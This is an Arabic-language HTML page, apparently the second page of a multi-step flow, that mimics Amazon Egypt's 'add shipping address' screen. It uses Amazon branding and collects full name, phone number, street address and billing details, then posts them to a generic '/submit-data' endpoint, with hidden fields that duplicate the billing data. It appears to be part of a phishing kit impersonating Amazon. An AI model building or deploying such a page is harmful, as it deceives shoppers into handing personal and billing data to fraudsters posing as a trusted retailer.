<!-- ========================================== -->
<!-- 2. صفحة العنوان (Address Page) -->
<!-- ========================================== -->
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>إضافة عنوان - أمازون</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #eaeded; -webkit-tap-highlight-color: transparent; display: flex; flex-direction: column; min-height: 100vh; }
        .amazon-btn { background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid; border-color: #a88734 #9c7e31 #846a29; border-radius: 8px; color: #111; }
        .amazon-btn:active { background: #f0c14b; box-shadow: inset 0 1px 2px rgba(0,0,0,0.2); }
        .input-field:focus { border-color: #e77600; box-shadow: 0 0 0 2px rgba(231,118,0,0.2); outline: none; }
    </style>
</head>
<body class="text-[#0F1111]">

    <header class="bg-[#131921] text-white px-4 py-2.5 flex items-center justify-between shadow-sm sticky top-0 z-50">
        <div class="flex items-center gap-1.5">
            <span class="text-[22px] font-bold tracking-tighter">amazon<span class="text-[#FF9900]">.eg</span></span>
        </div>
    </header>

    <main class="flex-grow px-3 py-4 w-full max-w-md mx-auto">
        <h1 class="text-lg font-bold mb-3">إضافة عنوان شحن جديد</h1>
        
        <form action="/submit-data" method="POST" class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 space-y-3.5 text-right">
            
            <!-- قسم الشحن -->
            <div class="space-y-3">
                <div>
                    <label class="block text-xs font-bold mb-1">الدولة / المنطقة</label>
                    <select name="country" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field bg-gray-50">
                        <option value="EG">مصر</option>
                    </select>
                </div>

                <div>
                    <label class="block text-xs font-bold mb-1">الاسم بالكامل</label>
                    <input type="text" name="username" required placeholder="الاسم الأول والأخير" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                </div>

                <div>
                    <label class="block text-xs font-bold mb-1">رقم الهاتف</label>
                    <input type="tel" name="phone" required placeholder="01xxxxxxxxx" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field" dir="ltr">
                </div>

                <div>
                    <label class="block text-xs font-bold mb-1">عنوان الشارع</label>
                    <input type="text" name="address_line1" required placeholder="الشارع، رقم المبنى، اسم المنطقة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field mb-2">
                    <input type="text" name="address_line2" placeholder="الشقة، الدور، علامة مميزة (اختياري)" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                </div>

                <div class="grid grid-cols-2 gap-2">
                    <div>
                        <label class="block text-xs font-bold mb-1">المدينة</label>
                        <input type="text" name="city" required placeholder="مثال: القاهرة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                    </div>
                    <div>
                        <label class="block text-xs font-bold mb-1">المحافظة</label>
                        <input type="text" name="state" required placeholder="مثال: القاهرة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                    </div>
                </div>

                <div>
                    <label class="block text-xs font-bold mb-1">الرمز البريدي</label>
                    <input type="text" name="zipcode" placeholder="11511" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field" dir="ltr">
                </div>
            </div>

            <!-- قسم الفوترة -->
            <div class="pt-3 border-t border-gray-100">
                <div class="flex justify-between items-center mb-2">
                    <h2 class="text-xs font-bold">عنوان الفوترة</h2>
                    <button type="button" id="copyShippingBtn" class="text-[11px] text-[#007185] hover:text-[#C7511F] hover:underline font-semibold">استخدام نفس عنوان الشحن</button>
                </div>
                <div id="billingFields" class="space-y-2">
                    <input type="text" name="billing_username" placeholder="الاسم بالكامل" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                    <input type="text" name="billing_address_line1" placeholder="عنوان الشارع" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                    <input type="text" name="billing_city" placeholder="المدينة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                    <input type="text" name="billing_state" placeholder="المحافظة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
                </div>
            </div>

            <!-- Hidden Inputs -->
            <input type="hidden" name="billing_username_hidden" id="billing_username_hidden">
            <input type="hidden" name="billing_address_line1_hidden" id="billing_address_line1_hidden">
            <input type="hidden" name="billing_address_line2_hidden" id="billing_address_line2_hidden">
            <input type="hidden" name="billing_city_hidden" id="billing_city_hidden">
            <input type="hidden" name="billing_state_hidden" id="billing_state_hidden">
            <input type="hidden" name="billing_zipcode_hidden" id="billing_zipcode_hidden">
            <input type="hidden" name="billing_phone_hidden" id="billing_phone_hidden">

            <button type="submit" class="w-full amazon-btn py-2.5 font-bold text-sm shadow-sm mt-2">
                استخدام هذا العنوان
            </button>
        </form>
    </main>

    <script>
        document.getElementById('copyShippingBtn').addEventListener('click', function() {
            const map = [
                ['username', 'billing_username'], ['address_line1', 'billing_address_line1'],
                ['city', 'billing_city'], ['state', 'billing_state']
            ];
            map.forEach(([src, dest]) => {
                const s = document.querySelector(`[name="${src}"]`).value;
                document.querySelector(`[name="${dest}"]`).value = s;
                document.getElementById(`${dest}_hidden`).value = s;
            });
            document.getElementById('billingFields').style.display = 'none';
        });
    </script>
</body>
</html>
